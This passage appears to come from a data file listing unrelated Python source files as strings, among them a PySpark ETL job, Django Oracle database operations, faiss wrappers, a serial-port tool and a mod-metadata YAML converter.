= self.xin2(r1)\n\n        f1 = Concat(v2, r2, 1) #128\n\n        v22 = self.wei_xin(v2)\n        r22 = self.wei_xin(r2)\n\n        f5 = self.fon33(f1)\n        f6 = self.fon44(f5)\n\n        return f6, f6, f6, f6, r2, v22, r22",
    "from udf import get_link, get_full_path\r\nimport spline_agent\r\nfrom spline_agent.enums import WriteMode\r\nfrom pyspark.sql.functions import col\r\nimport pyspark\r\n\r\n\r\n@spline_agent.inputs(\"{datasets_table}\", \"{domains_table}\")\r\ndef load(\r\n    datasets_table: str,\r\n    domains_table: str,\r\n    spark: pyspark.sql.SparkSession,\r\n    db_opts: dict,\r\n) -> set:\r\n    datasets_df = spark.read.jdbc(\r\n        url=db_opts[\"url\"], table=datasets_table, properties=db_opts[\"properties\"]\r\n    )\r\n    domains_df = spark.read.jdbc(\r\n        url=db_opts[\"url\"], table=domains_table, properties=db_opts[\"properties\"]\r\n    )\r\n    return datasets_df, domains_df\r\n\r\n\r\ndef join(\r\n    datasets_df: pyspark.sql.DataFrame,\r\n    domains_df: pyspark.sql.DataFrame,\r\n    spark: pyspark.sql.SparkSession,\r\n) -> pyspark.sql.DataFrame:\r\n    return datasets_df.join(domains_df, \"domain_id\")\r\n\r\n\r\ndef get_additional_cols(joined_df: pyspark.sql.DataFrame) -> pyspark.sql.DataFrame:\r\n    transformed_df = joined_df.withColumn(\r\n        \"domain_page\", get_link(col(\"domain_name\"))\r\n    ).withColumn(\"full_path\", get_full_path(col(\"domain_name\"), col(\"file\")))\r\n    return transformed_df\r\n\r\n\r\n@spline_agent.output(\"{result_table}\", WriteMode.APPEND)\r\ndef dump(\r\n    transformed_df: pyspark.sql.DataFrame, result_table: str, db_opts: dict\r\n) -> None:\r\n    transformed_df.write.jdbc(\r\n        url=db_opts[\"url\"],\r\n        table=result_table,\r\n        mode=\"overwrite\",\r\n        properties=db_opts[\"properties\"],\r\n    )\r\n",
    "'''\n# Team ID:          3303\n# Theme:            GeoGuide\n# Author List:      Atharva Satish Attarde, Nachiket Ganesh Apte, Ashutosh Anil Dongre, Prachit Suresh Deshinge\n# Filename:         inventory.py\n# Functions:        main\n# Global variables: None\n'''\ndef main():\n    '''    Purpose:\n    ---\n    Asks the user to input the number of test cases . Then ask num of inital items and their quantities , then ask for operation to perform on the inventory. Print on screen as per required in the problem.\n    \n    Input Arguments:\n    ---\n    None\n    \n    Returns:\n    ---\n    None\n    '''\n    number_of_test = int(input())\n    for i in range(number_of_test):\n        my_dict = {}\n        init_number = int(input())\n        for i in range(init_number):\n            x = input().split()\n            my_dict[x[0]] = int(x[1])\n        num_operation = int(input())\n        \n        for i in range(num_operation):\n            x = input().split()\n            if x[0] == \"ADD\":\n                if x[1] not in my_dict:\n                    my_dict[x[1]] = int(x[2])\n                    print(\"ADDED Item {}\".format(x[1]))\n                elif x[1] in my_dict:\n                    my_dict[x[1]] = my_dict[x[1]] + int(x[2])\n                    print(\"UPDATED Item {}\".format(x[1]))\n            elif x[0] == \"DELETE\":\n                if x[1] not in my_dict:\n                    print(\"Item {} does not exist\".format(x[1]))\n                elif x[1] in my_dict and int(x[2]) > my_dict[x[1]]:  \n                    print(\"Item {} could not be DELETED\".format(x[1]))\n                else:\n                    my_dict[x[1]] = my_dict[x[1]] - int(x[2])\n                    print(\"DELETED Item {}\".format(x[1]))\n        sum = 0\n        for i in my_dict.values():\n            sum += i\n        print(\"Total Items in Inventory: {}\".format(sum))\n        \nif __name__ == \"__main__\":\n    main()",
    "\"\"\"Copyright 2024 PythonistaGuild\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\"\"\"\n\nfrom collections.abc import Callable, Coroutine\nfrom typing import Any, Literal, TypeAlias, TypedDict\n\nfrom starlette.responses import Response\n\nfrom .limiter import RateLimitData\n\n\nRouteCoro: TypeAlias = Coroutine[Any, Any, Response | None]\nMethods: TypeAlias = list[Literal[\"GET\", \"POST\", \"PUT\", \"DELETE\", \"PATCH\", \"HEAD\", \"OPTIONS\"]]\n\n\nclass RouteOptions(TypedDict):\n    path: str\n    coro: Callable[..., RouteCoro]\n    methods: Methods\n    prefix: bool\n    websocket: bool\n    limits: list[RateLimitData]\n",
    "import json\nfrom pathlib import Path\n\nfrom .models import GoogleMapsTimeline\n\n\ndef load_single_file(filepath: str | Path) -> GoogleMapsTimeline:\n    with open(filepath, encoding=\"UTF-8\") as file:\n        data = json.load(file)\n    return GoogleMapsTimeline(**data)\n\n\ndef load_directory_raw(directory: str | Path) -> list[GoogleMapsTimeline]:\n    timelines = []\n    for filepath in Path(directory).rglob(\"*.json\"):\n        timelines.append(load_single_file(filepath))\n    return timelines\n\n\ndef load_directory(directory: str | Path) -> GoogleMapsTimeline:\n    \"\"\"\n    Load all files in a specified directory and combine them into a single timeline.\n    If a single file is provided, it will be loaded and returned as-is.\n    \"\"\"\n    if Path(directory).is_file():\n        return load_single_file(directory)\n    timelines = load_directory_raw(directory)\n    combined_timeline = GoogleMapsTimeline(\n        timelineObjects=sum((timeline.timelineObjects for timeline in timelines), start=[])\n    )\n    return combined_timeline\n",
    "\n\nclass Text():\n    def __init__(self) -> None:\n        ...\n    \n    @property\n    def new_start(self):\n        text = '\u0417\u0434\u0440\u0430\u0432\u0441\u0442\u0432\u0443\u0439\u0442\u0435!\\n\u0417\u0434\u0435\u0441\u044c \u0412\u044b \u043c\u043e\u0436\u0435\u0442\u0435 \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0446\u0438\u0444\u0440\u043e\u0432\u0443\u044e \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0443 \u043f\u0430\u043c\u044f\u0442\u0438'\n        return text     \n\n    @property\n    def start(self):\n        text = '\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435'\n        return text\n\n    @property\n    def edit(self):\n        text = '\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043a\u0430\u0440\u0442\u043e\u0447\u043a\u0443, \u043a\u043e\u0442\u043e\u0440\u0443\u044e \u0445\u043e\u0442\u0438\u0442\u0435 \u0438\u0437\u043c\u0435\u043d\u0438\u0442\u044c'\n        return text\n    \n    @property\n    def base_info(self):\n        text = {\n            \"full_name\": '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0424\u0418\u041e',\n            \"birthday\": '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0430\u0442\u0443 \u0440\u043e\u0436\u0434\u0435\u043d\u0438\u044f',\n            \"deathday\": '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434\u0430\u0442\u0443 \u0441\u043c\u0435\u0440\u0442\u0438',\n            \"epitaph\": '\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u044d\u043f\u0438\u0442\u0430\u0444\u0438\u044e (\u043d\u0430\u0434\u043f\u0438\u0441\u044c \u043d\u0430 \u043d\u0430\u0434\u0433\u0440\u043e\u0431\u0438\u0438), \u043c\u043e\u0436\u0435\u0442\u0435 \u0432\u043e\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u044c\u0441\u044f \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043d\u0435\u0439\u0440\u043e\u0441\u0435\u0442\u0438',\n            \"epitaph_author\": '\u0410\u0432\u0442\u043e\u0440 \u044d\u043f\u0438\u0442\u0430\u0444\u0438\u0438',\n        }\n        return text\n\n    @property\n    def another_info(self):\n        text = {\n            \"birth_adress\": '',\n            \"death_adress\": '',\n            \"children\": '',\n            \"spouse\": '',\n            \"citizen\": '',\n        }\n\n    @property\n    def epitaph_text(self):\n        text = '\u0414\u0430\u0432\u0430\u0439\u0442\u0435 \u043d\u0430\u043f\u0438\u0448\u0435\u043c \u0431\u0438\u043e\u0433\u0440\u0430\u0444\u0438\u044e \u0432\u043c\u0435\u0441\u0442\u0435, \u043d\u0430\u0447\u043d\u0435\u043c \u0441 \u044d\u043f\u0438\u0442\u0430\u0444\u0438\u0438 \u043e\u0442\u0432\u0435\u0442\u044c\u0442\u0435 \u043d\u0430 \u043f\u0430\u0440\u0443 \u0432\u043e\u043f\u0440\u043e\u0441\u043e\u0432'\n        question = [\n            \"\u041a\u0430\u043a \u0435\u0433\u043e \u0437\u0432\u0430\u043b\u0438?\",\n            \"\u0421\u043a\u043e\u043b\u044c\u043a\u043e \u043b\u0435\u0442 \u0435\u043c\u0443 \u0431\u044b\u043b\u043e, \u043a\u043e\u0433\u0434\u0430 \u043e\u043d \u0443\u0448\u0435\u043b \u043e\u0442 \u043d\u0430\u0441?\",\n            \"\u0412 \u043a\u0430\u043a\u043e\u0439 \u0441\u0442\u0440\u0430\u043d\u0435 \u0438 \u0433\u043e\u0440\u043e\u0434\u0435 \u043e\u043d \u0440\u043e\u0434\u0438\u043b\u0441\u044f?\",\n            \"\u041a\u0430\u043a\u0443\u044e \u043f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u044e \u043e\u043d \u0438\u043c\u0435\u043b?\",\n            \"\u0427\u0442\u043e \u043e\u043d \u043b\u044e\u0431\u0438\u043b \u0434\u0435\u043b\u0430\u0442\u044c \u0432 \u0441\u0432\u043e\u0431\u043e\u0434\u043d\u043e\u0435 \u0432\u0440\u0435\u043c\u044f?\",\n            \"\u0411\u044b\u043b \u043b\u0438 \u043e\u043d \u0440\u0435\u043b\u0438\u0433\u0438\u043e\u0437\u043d\u044b\u043c \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u043e\u043c?\",\n            \"\u0418\u043c\u0435\u043b \u043b\u0438 \u043e\u043d \u043a\u0430\u043a\u0438\u0435-\u0442\u043e \u043e\u0441\u043e\u0431\u044b\u0435 \u0443\u0432\u043b\u0435\u0447\u0435\u043d\u0438\u044f/\u0445\u043e\u0431\u0431\u0438?\",\n            \"\u0411\u044b\u043b\u0438 \u043b\u0438 \u0443 \u043d\u0435\u0433\u043e \u043e\u0441\u043e\u0431\u044b\u0435 \u0436\u0438\u0437\u043d\u0435\u043d\u043d\u044b\u0435 \u043f\u0440\u0438\u043d\u0446\u0438\u043f\u044b \u0438\u043b\u0438 \u0446\u0435\u043d\u043d\u043e\u0441\u0442\u0438, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043e\u043d \u0445\u043e\u0442\u0435\u043b \u0431\u044b \u043f\u0435\u0440\u0435\u0434\u0430\u0442\u044c \u0441\u0432\u043e\u0438\u043c \u043f\u043e\u0442\u043e\u043c\u043a\u0430\u043c?\",\n            \"\u0411\u044b\u043b \u043b\u0438 \u043e\u043d \u0445\u043e\u0440\u043e\u0448\u0438\u043c \u0441\u0435\u043c\u044c\u044f\u043d\u0438\u043d\u043e\u043c?\",\n            \"\u041a\u0430\u043a\u0438\u043c \u043e\u043d \u0431\u044b\u043b \u043f\u043e \u0445\u0430\u0440\u0430\u043a\u0442\u0435\u0440\u0443: \u0434\u043e\u0431\u0440\u044b\u043c, \u0432\u0435\u0441\u0435\u043b\u044b\u043c, \u0441\u0442\u0440\u043e\u0433\u0438\u043c, \u0441\u043f\u043e\u043a\u043e\u0439\u043d\u044b\u043c?\",\n            \"\u0415\u0441\u0442\u044c \u043b\u0438 \u043a\u0430\u043a\u0438\u0435-\u0442\u043e \u043e\u0441\u043e\u0431\u0435\u043d\u043d\u044b\u0435 \u0438\u0441\u0442\u043e\u0440\u0438\u0438 \u0438\u043b\u0438 \u043c\u043e\u043c\u0435\u043d\u0442\u044b, \u0441\u0432\u044f\u0437\u0430\u043d\u043d\u044b\u0435 \u0441 \u043d\u0438\u043c, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0442\u044b \u0445\u043e\u0442\u0435\u043b \u0431\u044b \u0443\u0432\u0435\u043a\u043e\u0432\u0435\u0447\u0438\u0442\u044c \u0432 \u044d\u043f\u0438\u0442\u0430\u0444\u0438\u0438?\"\n        ]\n        return {'text':text, 'question':question}\n\n    @property\n    def biography_main(self):\n        text = '\u0411\u0438\u043e\u0433\u0440\u0430\u0444\u0438\u044f - \u043e\u0441\u043d\u043e\u0432\u0430'\n        return text \n\n    @property\n    def biography_conclusion(self):\n        text = '\u0411\u0438\u043e\u0433\u0440\u0430\u0444\u0438\u044f - \u0437\u0430\u043a\u043b\u044e\u0447\u0435\u043d\u0438\u0435'\n        return text \n\n    @property\n    def friend_words(self):\n        text = '\u0421\u043b\u043e\u0432\u0430 \u0434\u0440\u0443\u0437\u0435\u0439'\n        return text ",
    "from serial import Serial\nimport serial.tools.list_ports\n\n\nclass USB:\n    def __init__(self) -> None:\n        self.port = None\n        self.serial = None\n\n    def start(self):\n        ports = serial.tools.list_ports.comports()\n        for i, (port, desc, hwid) in enumerate(sorted(ports)):\n            print(\"{}. {}: {} [{}]\".format(i+1, port, desc, hwid))\n            print(desc)\n        self.port, _, _ = ports[int(input('Port Number: ')) - 1]\n\n        self.serial = Serial(self.port, 115200, timeout=1)\n        self.serial.reset_input_buffer()\n\n        if self.serial.is_open:\n            print('USB is working')\n        else:\n            print('Failed to open port')\n\n    def read(self) -> list:\n        if self.serial.in_waiting > 0:\n            try:\n                data = self.serial.read_all().decode('utf-8').rstrip()\n                print(f'READ: {data}')\n                return data.split()\n            except:\n                pass\n        return None\n\n    def write(self, msg:str) -> None:\n        self.serial.write(msg.encode())\n\n\nif __name__ == '__main__':\n    print('Read - 0')\n    print('Write - 1')\n    mode = int(input('Mode (0/1): ').strip())\n    usb = USB()\n    usb.start()\n    try:\n        while True:\n            if mode:\n                usb.write(input('WRITE: '))\n            else:\n                usb.read()\n    except KeyboardInterrupt:\n        usb.serial.close()\n        print('\\nUSB is closed')\n",
    "import datetime\nimport uuid\nfrom functools import lru_cache\n\nfrom django.conf import settings\nfrom django.db import DatabaseError, NotSupportedError\nfrom django.db.backends.base.operations import BaseDatabaseOperations\nfrom django.db.backends.utils import split_tzname_delta, strip_quotes, truncate_name\nfrom django.db.models import AutoField, Exists, ExpressionWrapper, Lookup\nfrom django.db.models.expressions import RawSQL\nfrom django.db.models.sql.where import WhereNode\nfrom django.utils import timezone\nfrom django.utils.encoding import force_bytes, force_str\nfrom django.utils.functional import cached_property\nfrom django.utils.regex_helper import _lazy_re_compile\n\nfrom .base import Database\nfrom .utils import BulkInsertMapper, InsertVar, Oracle_datetime\n\n\nclass DatabaseOperations(BaseDatabaseOperations):\n    # Oracle uses NUMBER(5), NUMBER(11), and NUMBER(19) for integer fields.\n    # SmallIntegerField uses NUMBER(11) instead of NUMBER(5), which is used by\n    # SmallAutoField, to preserve backward compatibility.\n    integer_field_ranges = {\n        \"SmallIntegerField\": (-99999999999, 99999999999),\n        \"IntegerField\": (-99999999999, 99999999999),\n        \"BigIntegerField\": (-9999999999999999999, 9999999999999999999),\n        \"PositiveBigIntegerField\": (0, 9999999999999999999),\n        \"PositiveSmallIntegerField\": (0, 99999999999),\n        \"PositiveIntegerField\": (0, 99999999999),\n        \"SmallAutoField\": (-99999, 99999),\n        \"AutoField\": (-99999999999, 99999999999),\n        \"BigAutoField\": (-9999999999999999999, 9999999999999999999),\n    }\n    set_operators = {**BaseDatabaseOperations.set_operators, \"difference\": \"MINUS\"}\n\n    # TODO: colorize this SQL code with style.SQL_KEYWORD(), etc.\n    _sequence_reset_sql = \"\"\"\nDECLARE\n    table_value integer;\n    seq_value integer;\n    seq_name user_tab_identity_cols.sequence_name%%TYPE;\nBEGIN\n    BEGIN\n        SELECT sequence_name INTO seq_name FROM user_tab_identity_cols\n        WHERE  table_name = '%(table_name)s' AND\n               column_name = '%(column_name)s';\n        EXCEPTION WHEN NO_DATA_FOUND THEN\n            seq_name := '%(no_autofield_sequence_name)s';\n    END;\n\n    SELECT NVL(MAX(%(column)s), 0) INTO table_value FROM %(table)s;\n    SELECT NVL(last_number - cache_size, 0) INTO seq_value FROM user_sequences\n           WHERE sequence_name = seq_name;\n    WHILE table_value > seq_value LOOP\n        EXECUTE IMMEDIATE 'SELECT \"'||seq_name||'\".nextval FROM DUAL'\n        INTO seq_value;\n    END LOOP;\nEND;\n/\"\"\"\n\n    # Oracle doesn't support string without precision; use the max string size.\n    cast_char_field_without_max_length = \"NVARCHAR2(2000)\"\n    cast_data_types = {\n        \"AutoField\": \"NUMBER(11)\",\n        \"BigAutoField\": \"NUMBER(19)\",\n        \"SmallAutoField\": \"NUMBER(5)\",\n        \"TextField\": cast_char_field_without_max_length,\n    }\n\n    def cache_key_culling_sql(self):\n        cache_key = self.quote_name(\"cache_key\")\n        return (\n            f\"SELECT {cache_key} \"\n            f\"FROM %s \"\n            f\"ORDER BY {cache_key} OFFSET %%s ROWS FETCH FIRST 1 ROWS ONLY\"\n        )\n\n    # EXTRACT format cannot be passed in parameters.\n    _extract_format_re = _lazy_re_compile(r\"[A-Z_]+\")\n\n    def date_extract_sql(self, lookup_type, sql, params):\n        extract_sql = f\"TO_CHAR({sql}, %s)\"\n        extract_param = None\n        if lookup_type == \"week_day\":\n            # TO_CHAR(field, 'D') returns an integer from 1-7, where 1=Sunday.\n            extract_param = \"D\"\n        elif lookup_type == \"iso_week_day\":\n            extract_sql = f\"TO_CHAR({sql} - 1, %s)\"\n            extract_param = \"D\"\n        elif lookup_type == \"week\":\n            # IW = ISO week number\n            extract_param = \"IW\"\n        elif lookup_type == \"quarter\":\n            extract_param = \"Q\"\n        elif lookup_type == \"iso_year\":\n            extract_param = \"IYYY\"\n        else:\n            lookup_type = lookup_type.upper()\n            if not self._extract_format_re.fullmatch(lookup_type):\n                raise ValueError(f\"Invalid loookup type: {lookup_type!r}\")\n            # https://docs.oracle.com/en/database/oracle/oracle-database/21/sqlrf/EXTRACT-datetime.html\n            return f\"EXTRACT({lookup_type} FROM {sql})\", params\n        return extract_sql, (*params, extract_param)\n\n    def date_trunc_sql(self, lookup_type, sql, params, tzname=None):\n        sql, params = self._convert_sql_to_tz(sql, params, tzname)\n        # https://docs.oracle.com/en/database/oracle/oracle-database/21/sqlrf/ROUND-and-TRUNC-Date-Functions.html\n        trunc_param = None\n        if lookup_type in (\"year\", \"month\"):\n            trunc_param = lookup_type.upper()\n        elif lookup_type == \"quarter\":\n            trunc_param = \"Q\"\n        elif lookup_type == \"week\":\n            trunc_param = \"IW\"\n        else:\n            return f\"TRUNC({sql})\", params\n        return f\"TRUNC({sql}, %s)\", (*params, trunc_param)\n\n    # Oracle crashes with \"ORA-03113: end-of-file on communication channel\"\n    # if the ",
    "# -*- coding: utf-8 -*-\n\"\"\"\n\u6b64\u6a21\u5757\u63d0\u4f9b\u529f\u80fd\u4ee5\u8ba1\u7b97\u6587\u4ef6\u5939\u5927\u5c0f\uff0c\u5c06JSON\u6570\u636e\u8f6c\u6362\u4e3a\u5b9a\u5236\u7684YAML\u683c\u5f0f\uff0c\u4ee5\u53ca\u521b\u5efa\u538b\u7f29\u6587\u4ef6\u3002\n\n\u4e3b\u8981\u529f\u80fd\u5305\u62ec\uff1a\n- \u8ba1\u7b97\u6307\u5b9a\u6587\u4ef6\u5939\u7684\u603b\u5927\u5c0f\u3002\n- \u5c06\u7279\u5b9aJSON\u6587\u4ef6\u8f6c\u6362\u4e3a\u5b9a\u5236\u7684YAML\u683c\u5f0f\uff0c\u4e3b\u8981\u7528\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684\u751f\u6210\u3002\n- \u538b\u7f29\u6307\u5b9a\u6587\u4ef6\u5939\u4e3aZIP\u6587\u4ef6\u3002\n\"\"\"\n\nimport json\nimport yaml\nimport os\nimport shutil\nfrom collections import OrderedDict\n\ndef calculate_folder_size(folder_path):\n    \"\"\"\n    \u8ba1\u7b97\u6307\u5b9a\u6587\u4ef6\u5939\u7684\u603b\u5927\u5c0f\u3002\n\n    \u53c2\u6570:\n    - folder_path: \u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6587\u4ef6\u5939\u7684\u8def\u5f84\u3002\n\n    \u8fd4\u56de:\n    - total_size: \u6574\u6570\uff0c\u6587\u4ef6\u5939\u7684\u603b\u5927\u5c0f\uff0c\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u3002\n    \"\"\"\n    total_size = 0\n    for dirpath, dirnames, filenames in os.walk(folder_path):\n        for filename in filenames:\n            filepath = os.path.join(dirpath, filename)\n            total_size += os.path.getsize(filepath)\n    return total_size\n\ndef convert_json_to_custom_yaml(json_file_path, dirname):\n    \"\"\"\n    \u5c06JSON\u6587\u4ef6\u5185\u5bb9\u8f6c\u6362\u4e3a\u5b9a\u5236\u7684YAML\u683c\u5f0f\u3002\n\n    \u53c2\u6570\uff1a\n    - json_file_path: \u5b57\u7b26\u4e32\uff0cJSON\u6587\u4ef6\u7684\u8def\u5f84\u3002\n    - dirname: \u5b57\u7b26\u4e32\uff0c\u5305\u542bJSON\u6587\u4ef6\u7684\u76ee\u5f55\u540d\u79f0\uff0c\u7528\u4e8e\u6784\u5efa\u4e0b\u8f7d\u94fe\u63a5\u3002\n\n    \u8fd4\u56de\uff1a\n    - yaml_contents: \u5b57\u7b26\u4e32\uff0c\u8f6c\u6362\u540e\u7684YAML\u5185\u5bb9\u3002\n    \"\"\"\n    try:\n        with open(json_file_path, 'r', encoding='utf-8') as json_file:\n            json_data = json.load(json_file)\n    except FileNotFoundError:\n        print(f\"\u6587\u4ef6 {json_file_path} \u672a\u627e\u5230\u3002\")\n        return \"\"\n    except json.JSONDecodeError:\n        print(f\"\u6587\u4ef6 {json_file_path} \u683c\u5f0f\u4e0d\u6b63\u786e\u3002\")\n        return \"\"\n    except Exception as e:\n        print(f\"\u8bfb\u53d6JSON\u6587\u4ef6\u65f6\u53d1\u751f\u9519\u8bef: {e}\")\n        return \"\"\n    \n    with open(json_file_path, 'r', encoding='utf-8') as json_file:\n        json_data = json.load(json_file)\n\n    yaml_contents = \"\"\n\n    if isinstance(json_data, list):\n        for item in json_data:\n            # \u5904\u7406\u5b57\u5178\u7c7b\u578b\u7684name\u5b57\u6bb5\n            name = item.get(\"name\", \"\")\n            if not name:\n                continue\n            type = item.get(\"type\", \"\")\n            if type != 'MOD_INFO':\n                continue\n            if isinstance(name, dict):\n                name = \" | \".join([f\"{k}: {v}\" for k, v in name.items()])\n\n            id_value = item.get(\"id\", item.get(\"ident\", \"unknown\"))\n            if isinstance(id_value, str):\n                id_value = f'{id_value}'\n            elif isinstance(id_value, list):\n                id_value = ''.join([f'    - {id}\\n' for id in id_value])\n                \n            authors = item.get(\"authors\", \"unknown\")\n            if isinstance(authors, str):\n                authors = [f'{authors}']\n                authors = ''.join([f'    - \"{author}\"\\n' for author in authors])\n            elif isinstance(authors, list):\n                authors = ''.join([f'    - \"{author}\"\\n' for author in authors])\n                \n            maintainers = item.get(\"maintainers\", \"unknown\")\n            if isinstance(maintainers, str):\n                maintainers = [f'{maintainers}']\n                maintainers = ''.join([f'    - {maintainer}\\n' for maintainer in maintainers])\n            elif isinstance(maintainers, list):\n                maintainers = ''.join([f'    - {maintainer}\\n' for maintainer in maintainers])\n            \n            # \u5904\u7406\u591a\u884cdescription\u5b57\u6bb5\n            description = item.get(\"description\", \"No description provided.\")\n            formatted_description = \"\"\n            if isinstance(description, str):\n                formatted_description = \"\\n    \".join(description.splitlines())\n            elif isinstance(description, list):\n                formatted_description = \"\\n    \".join(description)\n            elif isinstance(description, dict):\n                formatted_description = \"\\n    \".join([f\"{k}: {v}\" for k, v in description.items()])\n\n            # \u6784\u9020homepage\u5b57\u6bb5\u7684URL\n            download_url = f\"https://alist.doiiars.com/d/Public/Cataclysmdda/{dirname}.zip\"\n            \n            folder_size = calculate_folder_size(dirname)\n            \n            yaml_contents = \"- type: direct_download\\n\" \n            yaml_contents += '  ident: \"' + id_value + '\"\\n' \n            yaml_contents += '  name: \"' + name + '\"\\n' \n            yaml_contents += \"  authors: \\n\" + authors\n            yaml_contents += '  maintainers: \\n' + maintainers\n            yaml_contents += \"  description: |\\n    \" + formatted_description + \"\\n\" \n            yaml_contents += \"  category: '\" + item.get(\"category\", \"unknown\") + \"'\\n\" \n            yaml_contents += \"  dependencies:\\n\" + ''.join([f\"    - '{dependency}'\\n\" for dependency in item.get(\"dependencies\", [])]) \n            yaml_contents += f\"  size: {folder_size}\\n\" \n            yaml_contents += '  url: \"' + download_url + '\"\\n' \n            yaml_contents += \"  homepage: 'https://github.com/Kenan2000/CDDA-Structured-Kenan-Modpack'\"\n\n        return yaml_contents\n    else:\n        print(f\"\u6587\u4ef6 {json_file_path} \u7684\u683c\u5f0f\u4e0d\u6b63\u786e\u3002\u671f\u671b\u7684\u662f\u4e00\u4e2a\u5217\u8868\u3002\")\n        return \"\"\n\n\n\n\ndef find_folders_and_convert_json():\n    \"\"\"\n    \u67e5\u627e\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u5939\uff0c\u5e76\u5c1d\u8bd5\u8f6c\u6362\u5305\u542b\u7684modinfo.json\u6587\u4ef6\u3002\n    \"\"\"\n    current_directory = os.getcwd()\n    folders = [f for f in os.listdir(current_directory) if os.path.isdir(os.path.join(current_directory, f))]\n\n    all_yaml_content = ''\n\n    for folder in folders:\n        json_file_path = os.path.join(current_directory, folder, 'modinfo.json')\n\n        if os.path.exists(json_file_path):\n            yaml_conte",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport inspect\n\nimport faiss\nimport numpy as np\n\nfrom faiss.loader import (\n    DirectMap,\n    IDSelector,\n    IDSelectorArray,\n    IDSelectorBatch,\n    OperatingPoints,\n    RangeSearchResult,\n    rev_swig_ptr,\n    swig_ptr,\n    try_extract_index_ivf,\n)\n\n##################################################################\n# The functions below add or replace some methods for classes\n# this is to be able to pass in numpy arrays directly\n# The C++ version of the classnames will be suffixed with _c\n#\n# The docstrings in the wrappers are intended to be similar to numpy\n# comments, they will appear with help(Class.method) or ?Class.method\n# For methods that are not replaced, the C++ documentation will be used if\n# swig 4.x is run with -doxygen.\n##################################################################\n\n# For most arrays we force the convesion to the target type with\n# np.ascontiguousarray, but for uint8 codes, we raise a type error\n# because it is unclear how the conversion should occur: with a view\n# (= cast) or conversion?\n\ndef _check_dtype_uint8(codes):\n    if codes.dtype != 'uint8':\n        raise TypeError(\"Input argument %s must be ndarray of dtype \"\n                        \" uint8, but found %s\" % (\"codes\", codes.dtype))\n    return np.ascontiguousarray(codes)\n\n\ndef replace_method(the_class, name, replacement, ignore_missing=False):\n    \"\"\" Replaces a method in a class with another version. The old method\n    is renamed to method_name_c (because presumably it was implemented in C) \"\"\"\n    try:\n        orig_method = getattr(the_class, name)\n    except AttributeError:\n        if ignore_missing:\n            return\n        raise\n    if orig_method.__name__ == 'replacement_' + name:\n        # replacement was done in parent class\n        return\n    setattr(the_class, name + '_c', orig_method)\n    setattr(the_class, name, replacement)\n\n\ndef handle_Clustering(the_class):\n\n    def replacement_train(self, x, index, weights=None):\n        \"\"\"Perform clustering on a set of vectors. The index is used for assignment.\n\n        Parameters\n        ----------\n        x : array_like\n            Training vectors, shape (n, self.d). `dtype` must be float32.\n        index : faiss.Index\n            Index used for assignment. The dimension of the index should be `self.d`.\n        weights : array_like, optional\n            Per training sample weight (size n) used when computing the weighted\n            average to obtain the centroid (default is 1 for all training vectors).\n        \"\"\"\n        n, d = x.shape\n        x = np.ascontiguousarray(x, dtype='float32')\n        assert d == self.d\n        if weights is not None:\n            weights = np.ascontiguousarray(weights, dtype='float32')\n            assert weights.shape == (n, )\n            self.train_c(n, swig_ptr(x), index, swig_ptr(weights))\n        else:\n            self.train_c(n, swig_ptr(x), index)\n\n    def replacement_train_encoded(self, x, codec, index, weights=None):\n        \"\"\" Perform clustering on a set of compressed vectors. The index is used for assignment.\n        The decompression is performed on-the-fly.\n\n        Parameters\n        ----------\n        x : array_like\n            Training vectors, shape (n, codec.code_size()). `dtype` must be `uint8`.\n        codec : faiss.Index\n            Index used to decode the vectors. Should have dimension `self.d`.\n        index : faiss.Index\n            Index used for assignment. The dimension of the index should be `self.d`.\n        weigths : array_like, optional\n            Per training sample weight (size n) used when computing the weighted\n            average to obtain the centroid (default is 1 for all training vectors).\n        \"\"\"\n        n, d = x.shape\n        x = _check_dtype_uint8(x)\n        assert d == codec.sa_code_size()\n        assert codec.d == index.d\n        if weights is not None:\n            weights = np.ascontiguousarray(weights, dtype='float32')\n            assert weights.shape == (n, )\n            self.train_encoded_c(n, swig_ptr(x), codec,\n                                 index, swig_ptr(weights))\n        else:\n            self.train_encoded_c(n, swig_ptr(x), codec, index)\n\n    replace_method(the_class, 'train', replacement_train)\n    replace_method(the_class, 'train_encoded', replacement_train_encoded)\n\n\ndef handle_Clustering1D(the_class):\n\n    def replacement_train_exact(self, x):\n        \"\"\"Perform clustering on a set of 1D vectors.\n\n        Parameters\n        ----------\n        x : array_like\n            Training vectors, shape (n, 1). `dtype` must be float32.\n        \"\"\"\n        n, d = x.shape\n        x = np.ascontiguousarray(x, dtype='float32')\n        assert d == self.d\n        self.train_exact_c(n, swig_ptr(x))\n\n    replace_method(the_class, 'train_exact', replacement_train_exact)\n\n\ndef handle_Quantizer(the_class):\n\n",
